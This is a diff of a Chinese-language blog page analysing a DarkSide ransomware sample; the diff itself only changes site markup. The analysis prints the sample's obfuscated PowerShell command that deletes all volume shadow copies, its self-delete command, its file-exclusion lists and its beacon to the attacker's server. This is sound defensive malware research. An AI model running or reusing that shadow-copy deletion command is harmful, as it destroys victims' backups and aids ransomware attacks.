@@ -47,7 +47,7 @@
 				<nav class="site-nav hide-in-mobile">
 					
 				<a href="https://www.a1ee.cn/basic/">BASIC</a>
-				<a href="https://www.a1ee.cn/simaple/">SIMAPLE</a>
+				<a href="https://www.a1ee.cn/simple/">SIMPLE</a>
 				<a href="https://www.a1ee.cn/medium/">MEDIUM</a>
 				<a href="https://www.a1ee.cn/about-me/">ABOUT</a>
 
@@ -61,7 +61,7 @@
 	<div id="mobile-menu" class="animated fast">
 		<ul>
 			<li><a href="https://www.a1ee.cn/basic/">BASIC</a></li>
-			<li><a href="https://www.a1ee.cn/simaple/">SIMAPLE</a></li>
+			<li><a href="https://www.a1ee.cn/simple/">SIMPLE</a></li>
 			<li><a href="https://www.a1ee.cn/medium/">MEDIUM</a></li>
 			<li><a href="https://www.a1ee.cn/about-me/">ABOUT</a></li>
 		</ul>
@@ -79,7 +79,7 @@
 				<h1 id="darksideransomware样本分析">DarksideRansomware样本分析<a href="#darksideransomware样本分析" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
 <h2 id="样本信息">样本信息<a href="#样本信息" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
 <p>本次分析的样本来源于<a href="https://bazaar.abuse.ch/sample/151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5/">MALWAREbazaar</a>。具体的SHA、MD5如下：</p>
-<pre><code>SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5
+<pre tabindex="0"><code>SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5
 SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57
 MD5 hash:9d418ecc0f3bf45029263b0944236884
 </code></pre><p>本次分析的环境是：<code>windows 7 ultimate sp1 x64</code></p>
@@ -95,14 +95,14 @@ MD5 hash:9d418ecc0f3bf45029263b0944236884
 <p>dll的加载又解密函数解密dll名称，再使用<code>loardlibrary</code>加载。解密函数核心流程如下：</p>
 <p><img src="/darkside_images/3880452197020.png" alt=""></p>
 <p>最后解出来的dll名称为：</p>
-<pre><code>ntdll,kernel32,advapi32,shell32,ole32,oleaut32,mpr,iphlpapi,shlwapi,gdi32,user32,netapi32,wsock32,wininet,wtsapi32
+<pre tabindex="0"><code>ntdll,kernel32,advapi32,shell32,ole32,oleaut32,mpr,iphlpapi,shlwapi,gdi32,user32,netapi32,wsock32,wininet,wtsapi32
 </code></pre><h4 id="字符串解析">字符串解析<a href="#字符串解析" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
 <p>以下就是字符串解析的核心算法：</p>
 <p><img src="/darkside_images/5527236106855.png" alt=""></p>
 <p>当解密函数运行结束，可以看到以下调用关系：</p>
 <p><img src="/darkside_images/1727847127021.png" alt=""></p>
 <p>手动导出字符串，内容如下：</p>
-<pre><code>$recycle.bin，config.msi，$windows.~bt，$windows.~ws，windows，appdata，application data，boot，google，mozilla，program files，program files (x86)，programdata，system volume information，tor browser，windows.old，intel，msocache，perflogs，x64dbg，public，all users，default
+<pre tabindex="0"><code>$recycle.bin，config.msi，$windows.~bt，$windows.~ws，windows，appdata，application data，boot，google，mozilla，program files，program files (x86)，programdata，system volume information，tor browser，windows.old，intel，msocache，perflogs，x64dbg，public，all users，default
 
 autorun.inf，boot.ini，bootfont.bin，bootsect.bak，desktop.ini，iconcache.db，ntldr，ntuser.dat，ntuser.dat.log，ntuser.ini，thumbs.db
 
@@ -152,7 +152,7 @@ DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTO
 <p>进入函数内部，根据api调用情况可以看到该函数结构简单：</p>
 <p><img src="/darkside_images/2427851119690.png" alt=""></p>
 <p>这里有两个判断较为重要</p>
-<pre><code>cmp dword ptr ds:[eax+0x8], 0x20
+<pre tabindex="0"><code>cmp dword ptr ds:[eax+0x8], 0x20
 cmp dword ptr ds:[eax+0xC], 0x220
 </code></pre><p>在微软官方的<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids">安全标识符说明</a>中可以找到sid的值为32和544的角色权限分别如下：</p>
 <p><img src="/darkside_images/5706513170561.png" alt=""></p>
@@ -288,7 +288,7 @@ cmp dword ptr ds:[eax+0xC], 0x220
 </table>
 <h4 id="发送信息至服务器函数">发送信息至服务器函数<a href="#发送信息至服务器函数" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
 <p>将本地的系统相关信息发送到攻击者的服务器：json格式内容如下：</p>
-<pre><code>{
+<pre tabindex="0"><code>{
 	&quot;bot&quot;:{
 	&quot;ver&quot;:&quot;1.8.6.2&quot;,
 	&quot;uid&quot;:&quot;060108efb510c98&quot;
@@ -310,9 +310,9 @@ cmp dword ptr ds:[eax+0xC], 0x220
 <p>核心代码如下：</p>
 <p><img src="/darkside_images/5604835168666.png" alt=""></p>
 <p>powershell命令如下：</p>
-<pre><code>40B5E2:L&quot;powershell -ep bypass -c \&quot;(0..61)|%{{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))}};iex $s\&quot;&quot;
+<pre tabindex="0"><code>40B5E2:L&quot;powershell -ep bypass -c \&quot;(0..61)|%{{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))}};iex $s\&quot;&quot;
 </code></pre><p>将十六进制转换成字符串如下：</p>
-<pre><code>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+<pre tabindex="0"><code>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
 </code></pre><h4 id="检索本地磁盘空闲空间">检索本地磁盘空闲空间<a href="#检索本地磁盘空闲空间" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
 <p>空闲空间检索存在两个判断，但至少保证有100mb才会进行下一步。</p>
 <p><img src="/darkside_images/192720173802.png" alt=""></p>
@@ -331,9 +331,9 @@ cmp dword ptr ds:[eax+0xC], 0x220
 <p>自我删除的主函数如下：</p>
 <p><img src="/darkside_images/33802100566.png" alt=""></p>
 <p>使用<code>Procmon</code>检测到的指令如下：</p>
-<pre><code>&quot;C:\Windows\system32\cmd.exe&quot; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
+<pre tabindex="0"><code>&quot;C:\Windows\system32\cmd.exe&quot; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
 </code></pre><p>在命令行使用<code>cmd /?</code>可以了解到：</p>
-<pre><code>/C      执行字符串指定的命令然后终止
+<pre tabindex="0"><code>/C      执行字符串指定的命令然后终止
 /Q      关闭回显
 /F      启用文件和目录名完成字符
 </code></pre><h2 id="总结">总结<a href="#总结" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
@@ -370,7 +370,7 @@ cmp dword ptr ds:[eax+0xC], 0x220
 	</main>
 
 	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
-		<p>&copy; 2021 <a href="https://www.a1ee.cn">alee</a></p>
+		<p>&copy; 2022 <a href="https://www.a1ee.cn">alee</a></p>
 	</footer>
 
 
